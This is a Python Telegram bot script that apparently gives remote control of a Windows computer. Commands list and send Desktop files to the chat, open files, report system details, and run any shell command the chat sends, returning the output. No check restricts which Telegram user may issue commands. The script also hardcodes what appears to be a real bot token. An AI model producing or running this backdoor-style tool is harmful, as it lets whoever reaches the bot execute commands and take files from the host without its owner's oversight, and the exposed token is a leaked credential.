from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

import os
import platform
import datetime
import subprocess

TOKEN = "7664216240:AAH1iDWhT5JhwpdPd-AnEEkSSwZLD5ZVin0"
# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 البوت جاهز للتحكم!")

# /info
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = f"""
🖥️ System: {platform.system()}
💻 Name: {platform.node()}
⚙️ CPU: {platform.processor()}
"""
    await update.message.reply_text(data)

# /time
async def time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    now = datetime.datetime.now()
    await update.message.reply_text(f"⏰ {now}")

# /files
async def files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    path = os.path.join(os.path.expanduser("~"), "Desktop")
    files = os.listdir(path)
    msg = "\n".join(files[:20])
    await update.message.reply_text(msg)

# 📂 /send file.txt
async def send_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ اكتب اسم الملف")
        return

    filename = " ".join(context.args)
    path = os.path.join(os.path.expanduser("~"), "Desktop", filename)

    if os.path.exists(path):
        await update.message.reply_document(document=open(path, 'rb'))
    else:
        await update.message.reply_text("❌ الملف غير موجود")

# 🌐 /ping
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        result = subprocess.check_output("ping google.com", shell=True)
        await update.message.reply_text("🌐 النت شغال!")
    except:
        await update.message.reply_text("❌ ما في اتصال")

# ⚡ /run dir
async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ اكتب أمر")
        return

    cmd = " ".join(context.args)

    try:
        result = subprocess.check_output(cmd, shell=True)
        await update.message.reply_text(result.decode()[:4000])
    except:
        await update.message.reply_text("❌ فشل التنفيذ")

# 📂 /openfile file.txt
async def open_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ اكتب اسم الملف")
        return

    filename = " ".join(context.args)
    path = os.path.join(os.path.expanduser("~"), "Desktop", filename)

    if os.path.exists(path):
        os.startfile(path)
        await update.message.reply_text("📂 تم فتح الملف")
    else:
        await update.message.reply_text("❌ الملف غير موجود")

# تشغيل
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("info", info))
app.add_handler(CommandHandler("time", time))
app.add_handler(CommandHandler("files", files))
app.add_handler(CommandHandler("send", send_file))
app.add_handler(CommandHandler("ping", ping))
app.add_handler(CommandHandler("run", run_cmd))
app.add_handler(CommandHandler("openfile", open_file))

app.run_polling()